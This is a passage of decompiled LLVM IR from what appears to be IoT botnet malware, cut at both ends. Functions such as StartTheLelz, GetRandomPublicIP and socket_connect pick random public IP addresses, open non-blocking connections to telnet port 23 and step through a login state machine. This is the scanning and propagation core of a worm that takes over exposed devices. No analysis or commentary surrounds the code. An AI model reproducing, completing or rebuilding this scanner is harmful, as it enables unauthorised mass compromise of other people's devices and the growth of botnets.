  %v4_aea4 = inttoptr i32 %v3_aea4 to i8*
  store i8 %v1_aea4, i8* %v4_aea4, align 1
  %v0_aea8 = call i32 @rand_cmwc()
  %v3_aeb4 = urem i32 %v0_aea8, 65536
  store i32 %v3_aeb4, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_aebc = trunc i32 %v0_aea8 to i8
  %v3_aebc = add i32 %tmp5, 4
  %v4_aebc = inttoptr i32 %v3_aebc to i8*
  store i8 %v1_aebc, i8* %v4_aebc, align 1
  %v0_aec0 = load i32, i32* %r3.global-to-local, align 4
  %v3_aec04 = udiv i32 %v0_aec0, 256
  %v1_aec4 = trunc i32 %v3_aec04 to i8
  %v2_aec4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aec4 = add i32 %v2_aec4, 5
  %v4_aec4 = inttoptr i32 %v3_aec4 to i8*
  store i8 %v1_aec4, i8* %v4_aec4, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aed0 = add i32 %tmp5, 6
  %v4_aed0 = inttoptr i32 %v3_aed0 to i8*
  store i8 0, i8* %v4_aed0, align 1
  %v0_aed4 = load i32, i32* %r3.global-to-local, align 4
  %v1_aed4 = trunc i32 %v0_aed4 to i8
  %v2_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aed4 = add i32 %v2_aed4, 7
  %v4_aed4 = inttoptr i32 %v3_aed4 to i8*
  store i8 %v1_aed4, i8* %v4_aed4, align 1
  %v3_aee0 = add i32 %tmp5, 8
  %v4_aee0 = inttoptr i32 %v3_aee0 to i8*
  store i8 -1, i8* %v4_aee0, align 1
  %v3_aeec = add i32 %tmp5, 9
  %v4_aeec = inttoptr i32 %v3_aeec to i8*
  store i8 %tmp, i8* %v4_aeec, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aef8 = add i32 %tmp5, 10
  %v4_aef8 = inttoptr i32 %v3_aef8 to i8*
  store i8 0, i8* %v4_aef8, align 1
  %v0_aefc = load i32, i32* %r3.global-to-local, align 4
  %v1_aefc = trunc i32 %v0_aefc to i8
  %v2_aefc = load i32, i32* %r2.global-to-local, align 4
  %v3_aefc = add i32 %v2_aefc, 11
  %v4_aefc = inttoptr i32 %v3_aefc to i8*
  store i8 %v1_aefc, i8* %v4_aefc, align 1
  %v2_af08 = add i32 %tmp5, 12
  %v3_af08 = inttoptr i32 %v2_af08 to i32*
  store i32 %arg3, i32* %v3_af08, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_af14 = add i32 %tmp5, 16
  %v3_af14 = inttoptr i32 %v2_af14 to i32*
  store i32 %arg2, i32* %v3_af14, align 4
  store i32 %v3_ae10, i32* @fp, align 4
  ret i32 %v0_aea8

; uselistorder directives
  uselistorder i32 %v0_aea8, { 1, 2, 0 }
  uselistorder i32 %v3_aea0, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp5, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_af3c = icmp sgt i32 %arg1, 2
  br i1 %v8_af3c, label %dec_label_pc_af4c, label %dec_label_pc_af5c

dec_label_pc_af4c:                                ; preds = %entry
  %v1_af50 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %entry, %dec_label_pc_af4c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_af4c ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_af5c, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af70 = load i32, i32* @fp, align 4
  store i32 44920, i32* %stack_var_-4, align 4
  %v2_af74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af74, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_af9c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_afac = icmp eq i32 %v1_af9c, 0
  br i1 %v2_afac, label %dec_label_pc_afb4, label %dec_label_pc_afc0

dec_label_pc_afb4:                                ; preds = %entry
  br label %dec_label_pc_b0a8

dec_label_pc_afc0:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_afc4 = add i32 %v1_af9c, 16
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  %v3_afc4 = load i32, i32* %v2_afc4, align 4
  %v1_afc8 = inttoptr i32 %v3_afc4 to i32*
  %v2_afc8 = load i32, i32* %v1_afc8, align 4
  %v1_afd0 = add i32 %v1_af9c, 12
  %v2_afd0 = inttoptr i32 %v1_afd0 to i32*
  %v3_afd0 = load i32, i32* %v2_afd0, align 4
  store i32 %v3_afd0, i32* @r2, align 4
  %v2_afdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_afe8 = call i32 @bcopy(i32 %v2_afc8, i32 %v2_afdc, i32 %v3_afd0)
  %v1_b000 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_b030 = call i32 @socket()
  %v2_b03c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_b03c, i32* @ip, align 4
  %v6_b058 = call i32 @__GI_setsockopt(i32 %v0_b030, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_b060 = icmp eq i32 %v0_b030, -1
  br i1 %v3_b060, label %dec_label_pc_b068, label %dec_label_pc_b074

dec_label_pc_b068:                                ; preds = %dec_label_pc_afc0
  br label %dec_label_pc_b0a8

dec_label_pc_b074:                                ; preds = %dec_label_pc_afc0
  %v3_b084 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_b084 = call i32 @__libc_connect(i32 %v0_b030, %sockaddr* %v3_b084, i32 16)
  %v3_b08c = icmp eq i32 %v4_b084, -1
  br i1 %v3_b08c, label %dec_label_pc_b094, label %dec_label_pc_b0a0

dec_label_pc_b094:                                ; preds = %dec_label_pc_b074
  br label %dec_label_pc_b0a8

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b074
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b094, %dec_label_pc_b068, %dec_label_pc_afb4, %dec_label_pc_b0a0
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_afb4 ], [ 0, %dec_label_pc_b068 ], [ 0, %dec_label_pc_b094 ], [ %v0_b030, %dec_label_pc_b0a0 ]
  store i32 %v3_af70, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b0a8, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b0b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b0b8, i32* %ip.global-to-local, align 4
  %v3_b0bc = load i32, i32* @r4, align 4
  store i32 %v3_b0bc, i32* %stack_var_-24, align 4
  store i32 45252, i32* %stack_var_-4, align 4
  %v19_b0bc = ptrtoint i32* %stack_var_-24 to i32
  %v2_b0c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0c0, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_b0dc = call i32 @__GI_time(i32* null)
  store i32 %v2_b0dc, i32* %r3.global-to-local, align 4
  store i32 %v2_b0dc, i32* @r4, align 4
  %v0_b0e8 = call i32 @rand_cmwc()
  %v0_b0f0 = load i32, i32* @r4, align 4
  %v2_b0f0 = xor i32 %v0_b0f0, %v0_b0e8
  store i32 %v2_b0f0, i32* %r3.global-to-local, align 4
  %v1_b0f8 = call i32 @srand(i32 %v2_b0f0)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b110 = call i32 @htons(i32 23)
  %v2_b128 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_b128, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b144 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_b16c = inttoptr i32 %v1_b144 to i8*
  %v3_b16c = call i32 @__GI_memset(i8* %v2_b16c, i32 0)
  %v2_b17c = mul i32 %arg2, 28
  %v1_b180 = or i32 %v2_b17c, 3
  %v1_b184 = add i32 %v1_b180, 3
  %v3_b188 = and i32 %v1_b184, -4
  %v1_b190 = load i32, i32* @sp, align 4
  %v2_b190 = sub i32 %v1_b190, %v3_b188
  %v1_b1a0 = add i32 %v2_b190, 7
  %v3_b1a4 = and i32 %v1_b1a0, -4
  %v2_b1c8 = mul i32 %arg2, 5
  store i32 %v2_b1c8, i32* %r3.global-to-local, align 4
  store i32 %v2_b1c8, i32* @r2, align 4
  %v2_b1dc = inttoptr i32 %v3_b1a4 to i8*
  %v3_b1dc = call i32 @__GI_memset(i8* %v2_b1dc, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2bc61 = icmp sgt i32 %arg2, 0
  br i1 %v5_b2bc61, label %dec_label_pc_b1ec, label %dec_label_pc_b2c0

dec_label_pc_b1ec:                                ; preds = %entry, %dec_label_pc_b1ec
  %storemerge462 = phi i32 [ %v1_b2a8, %dec_label_pc_b1ec ], [ 0, %entry ]
  %v2_b1fc = mul i32 %storemerge462, 28
  %v2_b200 = add i32 %v2_b1fc, %v3_b1a4
  store i32 %v2_b200, i32* %r3.global-to-local, align 4
  %v2_b208 = inttoptr i32 %v2_b200 to i32*
  store i32 0, i32* %v2_b208, align 4
  %v0_b20c = load i32, i32* %r3.global-to-local, align 4
  %v1_b20c = add i32 %v0_b20c, 4
  store i32 %v1_b20c, i32* %r3.global-to-local, align 4
  %v2_b214 = inttoptr i32 %v1_b20c to i32*
  store i32 0, i32* %v2_b214, align 4
  %v0_b218 = load i32, i32* %r3.global-to-local, align 4
  %v1_b218 = add i32 %v0_b218, 4
  store i32 %v1_b218, i32* %r3.global-to-local, align 4
  %v2_b220 = inttoptr i32 %v1_b218 to i32*
  store i32 0, i32* %v2_b220, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 4
  store i32 %v1_b224, i32* %r3.global-to-local, align 4
  %v2_b22c = inttoptr i32 %v1_b224 to i32*
  store i32 0, i32* %v2_b22c, align 4
  %v0_b230 = load i32, i32* %r3.global-to-local, align 4
  %v1_b230 = add i32 %v0_b230, 4
  store i32 %v1_b230, i32* %r3.global-to-local, align 4
  %v2_b238 = inttoptr i32 %v1_b230 to i32*
  store i32 0, i32* %v2_b238, align 4
  %v0_b23c = load i32, i32* %r3.global-to-local, align 4
  %v1_b23c = add i32 %v0_b23c, 4
  store i32 %v1_b23c, i32* %r3.global-to-local, align 4
  %v2_b244 = inttoptr i32 %v1_b23c to i32*
  store i32 0, i32* %v2_b244, align 4
  %v0_b248 = load i32, i32* %r3.global-to-local, align 4
  %v1_b248 = add i32 %v0_b248, 4
  %v2_b250 = inttoptr i32 %v1_b248 to i32*
  store i32 0, i32* %v2_b250, align 4
  %v3_b278 = add i32 %v2_b200, 9
  %v4_b278 = inttoptr i32 %v3_b278 to i8*
  store i8 1, i8* %v4_b278, align 1
  %v2_b298 = add i32 %v2_b200, 24
  %v2_b2a0 = inttoptr i32 %v2_b298 to i32*
  store i32 %v1_b144, i32* %v2_b2a0, align 4
  %v1_b2a8 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_b2a8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2bc = icmp slt i32 %v1_b2a8, %arg2
  br i1 %v5_b2bc, label %dec_label_pc_b1ec, label %dec_label_pc_b2c0

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b1ec, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b2c8

dec_label_pc_b2c8:                                ; preds = %dec_label_pc_b2c8, %dec_label_pc_b2c0
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b2c0 ], [ %v1_b2cc, %dec_label_pc_b2c8 ]
  %v1_b2cc = add i32 %stack_var_-56.0, 1
  store i32 %v1_b2cc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_23704.93 to i32), i32* %r3.global-to-local, align 4
  %v4_b2dc = mul i32 %v1_b2cc, 4
  %v5_b2dc = add i32 %v4_b2dc, ptrtoint ([10 x i8*]* @global_var_23704.93 to i32)
  %v6_b2dc = inttoptr i32 %v5_b2dc to i32*
  %v7_b2dc = load i32, i32* %v6_b2dc, align 4
  store i32 %v7_b2dc, i32* %r3.global-to-local, align 4
  %v2_b2e0 = icmp eq i32 %v7_b2dc, 0
  br i1 %v2_b2e0, label %dec_label_pc_b2e8.preheader, label %dec_label_pc_b2c8

dec_label_pc_b2e8.preheader:                      ; preds = %dec_label_pc_b2c8
  %v2_b370 = add i32 %v3_b1a4, 8
  %v2_b64c = add i32 %v3_b1a4, 4
  %v3_b73c = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_b7ac = ptrtoint i32* %stack_var_-324 to i32
  %v2_b8a8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_b904 = ptrtoint i32* %stack_var_-340 to i32
  %v2_b908 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ba24 = add i32 %v3_b1a4, 16
  %v2_baa0 = add i32 %v3_b1a4, 24
  br label %dec_label_pc_b2e8

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b2e8, %dec_label_pc_c420, %dec_label_pc_b2e8.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_b2bc61, label %dec_label_pc_b2f4, label %dec_label_pc_b2e8

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b2e8, %dec_label_pc_c420
  %storemerge553 = phi i32 [ %v1_c424, %dec_label_pc_c420 ], [ 0, %dec_label_pc_b2e8 ]
  %v3_b300 = mul i32 %storemerge553, 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b308 = mul i32 %storemerge553, 28
  %v2_b30c = add i32 %v2_b308, %v3_b1a4
  %v2_b310 = add i32 %v2_b30c, 16
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v1_b314 = inttoptr i32 %v2_b310 to i32*
  %v2_b314 = load i32, i32* %v1_b314, align 4
  store i32 %v2_b314, i32* %r3.global-to-local, align 4
  %v2_b318 = icmp eq i32 %v2_b314, 0
  br i1 %v2_b318, label %dec_label_pc_b320, label %dec_label_pc_b358

dec_label_pc_b320:                                ; preds = %dec_label_pc_b2f4
  store i32 %storemerge553, i32* @r4, align 4
  %v2_b328 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b33c = load i32, i32* @r4, align 4
  %v3_b340 = mul i32 %v0_b33c, 4
  store i32 %v3_b340, i32* %r2.global-to-local, align 4
  %v2_b348 = mul i32 %v0_b33c, 28
  %v2_b350 = add i32 %v2_ba24, %v2_b348
  store i32 %v2_b350, i32* %r3.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v2_b350 to i32*
  store i32 %v2_b328, i32* %v2_b354, align 4
  br label %dec_label_pc_b358

dec_label_pc_b358:                                ; preds = %dec_label_pc_b2f4, %dec_label_pc_b320
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b374 = add i32 %v2_b370, %v2_b308
  store i32 %v2_b374, i32* %r3.global-to-local, align 4
  %v1_b378 = inttoptr i32 %v2_b374 to i8*
  %v2_b378 = load i8, i8* %v1_b378, align 4
  %v3_b378 = sext i8 %v2_b378 to i32
  %v4_b378 = zext i8 %v2_b378 to i32
  store i32 %v4_b378, i32* %r3.global-to-local, align 4
  switch i32 %v3_b378, label %dec_label_pc_c420 [
    i32 0, label %dec_label_pc_b3a8
    i32 1, label %dec_label_pc_b7c0.lr.ph
    i32 2, label %dec_label_pc_ba6c
    i32 3, label %dec_label_pc_bbb8
    i32 4, label %dec_label_pc_bd0c
    i32 5, label %dec_label_pc_be58
    i32 6, label %dec_label_pc_bfac
    i32 7, label %dec_label_pc_c2b0
  ]

dec_label_pc_b3a8:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b3c4 = add i32 %v2_b30c, 8
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b3c8 = add i32 %v2_b30c, 9
  %v2_b3c8 = inttoptr i32 %v1_b3c8 to i8*
  %v3_b3c8 = load i8, i8* %v2_b3c8, align 1
  %v7_b3cc = icmp eq i8 %v3_b3c8, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_b3cc, label %dec_label_pc_b3d4, label %dec_label_pc_b4c0

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b3a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b3f0 = add i32 %v2_b30c, 24
  store i32 %v2_b3f0, i32* %r3.global-to-local, align 4
  %v1_b3f4 = inttoptr i32 %v2_b3f0 to i32*
  %v2_b3f4 = load i32, i32* %v1_b3f4, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b418 = inttoptr i32 %v2_b30c to i32*
  store i32 0, i32* %v2_b418, align 4
  %v0_b41c = load i32, i32* %r3.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 4
  store i32 %v1_b41c, i32* %r3.global-to-local, align 4
  %v2_b424 = inttoptr i32 %v1_b41c to i32*
  store i32 0, i32* %v2_b424, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = add i32 %v0_b428, 4
  store i32 %v1_b428, i32* %r3.global-to-local, align 4
  %v2_b430 = inttoptr i32 %v1_b428 to i32*
  store i32 0, i32* %v2_b430, align 4
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 4
  store i32 %v1_b434, i32* %r3.global-to-local, align 4
  %v2_b43c = inttoptr i32 %v1_b434 to i32*
  store i32 0, i32* %v2_b43c, align 4
  %v0_b440 = load i32, i32* %r3.global-to-local, align 4
  %v1_b440 = add i32 %v0_b440, 4
  store i32 %v1_b440, i32* %r3.global-to-local, align 4
  %v2_b448 = inttoptr i32 %v1_b440 to i32*
  store i32 0, i32* %v2_b448, align 4
  %v0_b44c = load i32, i32* %r3.global-to-local, align 4
  %v1_b44c = add i32 %v0_b44c, 4
  store i32 %v1_b44c, i32* %r3.global-to-local, align 4
  %v2_b454 = inttoptr i32 %v1_b44c to i32*
  store i32 0, i32* %v2_b454, align 4
  %v0_b458 = load i32, i32* %r3.global-to-local, align 4
  %v1_b458 = add i32 %v0_b458, 4
  %v2_b460 = inttoptr i32 %v1_b458 to i32*
  store i32 0, i32* %v2_b460, align 4
  store i32 %v2_b3f0, i32* %r2.global-to-local, align 4
  store i32 %v2_b3f4, i32* %r3.global-to-local, align 4
  store i32 %v2_b3f4, i32* %v1_b3f4, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_b490 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b1a4, i32 %v2_b3f0, i32 %v2_b3f4, i32 %v2_b3f4)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r4, align 4
  %v3_b4a4 = mul i32 %v0_b4a0, 4
  store i32 %v3_b4a4, i32* %r2.global-to-local, align 4
  %v2_b4ac = mul i32 %v0_b4a0, 28
  %v2_b4b4 = add i32 %v2_b64c, %v2_b4ac
  store i32 %v2_b4b4, i32* %r3.global-to-local, align 4
  %v2_b4b8 = inttoptr i32 %v2_b4b4 to i32*
  store i32 %v5_b490, i32* %v2_b4b8, align 4
  br label %dec_label_pc_b5f4

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b3a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v3_b4e0 = load i8, i8* %v2_b3c8, align 1
  %v4_b4e0 = zext i8 %v3_b4e0 to i32
  store i32 %v4_b4e0, i32* %r3.global-to-local, align 4
  %v2_b4e4 = icmp eq i8 %v3_b4e0, 0
  br i1 %v2_b4e4, label %dec_label_pc_b4ec, label %dec_label_pc_b5f4

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4c0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b510 = add i32 %v2_b30c, 11
  %v2_b510 = inttoptr i32 %v1_b510 to i8*
  %v3_b510 = load i8, i8* %v2_b510, align 1
  %v1_b514 = add i8 %v3_b510, 1
  store i8 %v1_b514, i8* %v2_b510, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b568 = add i32 %v2_b30c, 10
  %v2_b568 = inttoptr i32 %v1_b568 to i8*
  %v3_b568 = load i8, i8* %v2_b568, align 2
  %v1_b56c = add i8 %v3_b568, 1
  store i32 %v3_b1a4, i32* %ip.global-to-local, align 4
  store i8 %v1_b56c, i8* %v2_b568, align 2
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v3_b5bc = load i8, i8* %v2_b568, align 2
  %v4_b5bc = zext i8 %v3_b5bc to i32
  store i32 %v4_b5bc, i32* %r3.global-to-local, align 4
  %v7_b5c0 = icmp eq i8 %v3_b5bc, 9
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f4

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b4ec
  store i32 %v2_b3c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b3c8, align 1
  br label %dec_label_pc_c420

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_b4c0, %dec_label_pc_b3d4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b608 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b650 = add i32 %v2_b64c, %v2_b308
  store i32 %v2_b650, i32* %r3.global-to-local, align 4
  %v1_b654 = inttoptr i32 %v2_b650 to i32*
  %v2_b654 = load i32, i32* %v1_b654, align 4
  store i32 %v2_b654, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_b66c = call i32 @socket()
  %v0_b674 = load i32, i32* @r4, align 4
  %v2_b680 = mul i32 %v0_b674, 28
  %v2_b684 = add i32 %v2_b680, %v3_b1a4
  %v2_b688 = inttoptr i32 %v2_b684 to i32*
  store i32 %v0_b66c, i32* %v2_b688, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_b6a4 = inttoptr i32 %v2_b30c to i32*
  %v2_b6a4 = load i32, i32* %v1_b6a4, align 4
  store i32 %v2_b6a4, i32* %r3.global-to-local, align 4
  %v7_b6a8 = icmp eq i32 %v2_b6a4, -1
  br i1 %v7_b6a8, label %dec_label_pc_c420, label %dec_label_pc_b6b0

dec_label_pc_b6b0:                                ; preds = %dec_label_pc_b5f4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b6c8 = load i32, i32* %v1_b6a4, align 4
  store i32 %v2_b6c8, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b6e4 = load i32, i32* %v1_b6a4, align 4
  store i32 %v2_b6e4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b6f4 = call i32 @__libc_fcntl(i32 %v2_b6e4, i32 3)
  %v1_b6fc = or i32 %v2_b6f4, 2048
  store i32 %v1_b6fc, i32* %r3.global-to-local, align 4
  %v0_b700 = load i32, i32* @r4, align 4
  store i32 %v1_b6fc, i32* @r2, align 4
  %v2_b70c = call i32 @__libc_fcntl(i32 %v0_b700, i32 4)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b728 = load i32, i32* %v1_b6a4, align 4
  store i32 %v2_b728, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_b73c = call i32 @__libc_connect(i32 %v2_b728, %sockaddr* nonnull %v3_b73c, i32 16)
  store i32 %v4_b73c, i32* %r3.global-to-local, align 4
  %v3_b744 = icmp eq i32 %v4_b73c, -1
  br i1 %v3_b744, label %dec_label_pc_b74c, label %dec_label_pc_b784

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b6b0
  %v0_b74c = call i32 @__errno_location()
  store i32 %v0_b74c, i32* %r3.global-to-local, align 4
  %v1_b754 = inttoptr i32 %v0_b74c to i32*
  %v2_b754 = load i32, i32* %v1_b754, align 4
  store i32 %v2_b754, i32* %r3.global-to-local, align 4
  %v7_b758 = icmp eq i32 %v2_b754, 115
  br i1 %v7_b758, label %dec_label_pc_b784, label %dec_label_pc_b760

dec_label_pc_b760:                                ; preds = %dec_label_pc_b74c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b77c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_b784:                                ; preds = %dec_label_pc_b6b0, %dec_label_pc_b74c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b7a4 = call i32 @advance_state(i32* nonnull %v1_b6a4, i32 1)
  br label %dec_label_pc_c420

dec_label_pc_b7c0.lr.ph:                          ; preds = %dec_label_pc_b358
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b7c0

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b7c0.lr.ph, %dec_label_pc_b7c0
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b7c0.lr.ph ], [ %v1_b7d4, %dec_label_pc_b7c0 ]
  store i32 %v2_b7ac, i32* %r2.global-to-local, align 4
  %v5_b7cc = mul nuw nsw i32 %storemerge610, 4
  %v6_b7cc = add i32 %v5_b7cc, %v2_b7ac
  %v7_b7cc = inttoptr i32 %v6_b7cc to i32*
  store i32 0, i32* %v7_b7cc, align 4
  %v1_b7d4 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_b7d4, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_b7d4, 32
  br i1 %tmp43, label %dec_label_pc_b7c0, label %dec_label_pc_b7e8

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b7c0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_b800 = inttoptr i32 %v2_b30c to i32*
  %v2_b800 = load i32, i32* %v1_b800, align 4
  %v3_b804 = udiv i32 %v2_b800, 32
  %v3_b818 = mul nuw nsw i32 %v3_b804, 4
  %v2_b820 = add i32 %v3_b818, %v19_b0bc
  store i32 %v2_b820, i32* %r2.global-to-local, align 4
  %v2_b824 = add i32 %v2_b820, -300
  store i32 %v2_b824, i32* %r3.global-to-local, align 4
  %v1_b828 = inttoptr i32 %v2_b824 to i32*
  %v2_b828 = load i32, i32* %v1_b828, align 4
  store i32 %v2_b828, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b844 = load i32, i32* %v1_b800, align 4
  %v1_b848 = urem i32 %v2_b844, 32
  %v6_b850 = shl i32 1, %v1_b848
  %v2_b854 = or i32 %v6_b850, %v2_b828
  store i32 %v2_b854, i32* %v1_b828, align 4
